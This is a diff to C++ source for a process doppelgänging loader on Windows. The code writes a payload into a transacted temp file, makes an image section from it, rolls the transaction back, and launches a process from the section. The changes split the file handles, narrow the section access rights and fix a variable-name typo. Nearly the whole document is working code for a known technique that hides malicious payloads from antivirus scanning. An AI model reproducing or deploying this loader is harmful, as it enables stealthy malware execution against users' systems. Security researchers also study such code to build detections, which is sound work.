@@ -16,7 +16,7 @@
 
 #define PAGE_SIZE 0x1000
 
-HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
+HANDLE make_transacted_section(BYTE* payloadBuf, DWORD payloadSize)
 {
     DWORD options, isolationLvl, isolationFlags, timeout;
     options = isolationLvl = isolationFlags = timeout = 0;
@@ -31,9 +31,9 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
     DWORD size = GetTempPathW(MAX_PATH, temp_path);
 
     GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
-    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
-        GENERIC_WRITE | GENERIC_READ,
-        0,
+    HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
+        GENERIC_WRITE,
+        FILE_SHARE_READ,
         NULL,
         CREATE_ALWAYS,
         FILE_ATTRIBUTE_NORMAL,
@@ -42,32 +42,50 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
         NULL,
         NULL
     );
-    if (hTransactedFile == INVALID_HANDLE_VALUE) {
+    if (hTransactedWriter == INVALID_HANDLE_VALUE) {
         std::cerr << "Failed to create transacted file: " << GetLastError() << std::endl;
         return INVALID_HANDLE_VALUE;
     }
 
     DWORD writtenLen = 0;
-    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
+    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL)) {
         std::cerr << "Failed writing payload! Error: " << GetLastError() << std::endl;
+        return INVALID_HANDLE_VALUE;
+    }
+    CloseHandle(hTransactedWriter);
+    hTransactedWriter = nullptr;
+
+    HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
+        GENERIC_READ,
+        FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL,
+        hTransaction,
+        NULL,
+        NULL
+    );
+    if (hTransactedReader == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to open transacted file: " << GetLastError() << std::endl;
         return INVALID_HANDLE_VALUE;
     }
 
     HANDLE hSection = nullptr;
     NTSTATUS status = NtCreateSection(&hSection,
-        SECTION_ALL_ACCESS,
+        SECTION_MAP_EXECUTE,
         NULL,
         0,
         PAGE_READONLY,
         SEC_IMAGE,
-        hTransactedFile
+        hTransactedReader
     );
     if (status != STATUS_SUCCESS) {
         std::cerr << "NtCreateSection failed: " << std::hex << status << std::endl;
         return INVALID_HANDLE_VALUE;
     }
-    CloseHandle(hTransactedFile);
-    hTransactedFile = nullptr;
+    CloseHandle(hTransactedReader);
+    hTransactedReader = nullptr;
 
     if (RollbackTransaction(hTransaction) == FALSE) {
         std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
@@ -80,9 +98,9 @@ HANDLE make_transacted_section(wchar_t* targetPath, BYTE* payladBuf, DWORD paylo
 }
 
 
-bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
+bool process_doppel(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize)
 {
-    HANDLE hSection = make_transacted_section(targetPath, payladBuf, payloadSize);
+    HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);
     if (!hSection || hSection == INVALID_HANDLE_VALUE) {
         return false;
     }
@@ -128,7 +146,7 @@ bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 #ifdef _DEBUG
     std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
 #endif
-    DWORD payload_ep = get_entry_point_rva(payladBuf);
+    DWORD payload_ep = get_entry_point_rva(payloadBuf);
     ULONGLONG procEntry =  payload_ep + imageBase;
 
     if (!setup_process_parameters(hProcess, pi, targetPath)) {
@@ -190,15 +208,15 @@ int wmain(int argc, wchar_t *argv[])
     wchar_t *payloadPath = argv[1];
     size_t payloadSize = 0;
 
-    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
-    if (payladBuf == NULL) {
+    BYTE* payloadBuf = buffer_payload(payloadPath, payloadSize);
+    if (payloadBuf == NULL) {
         std::cerr << "Cannot read payload!" << std::endl;
         return -1;
     }
 
-    bool is_ok = process_doppel(targetPath, payladBuf, (DWORD) payloadSize);
+    bool is_ok = process_doppel(targetPath, payloadBuf, (DWORD) payloadSize);
 
-    free_buffer(payladBuf, payloadSize);
+    free_buffer(payloadBuf, payloadSize);
     if (is_ok) {
         std::cerr << "[+] Done!" << std::endl;
     } else {
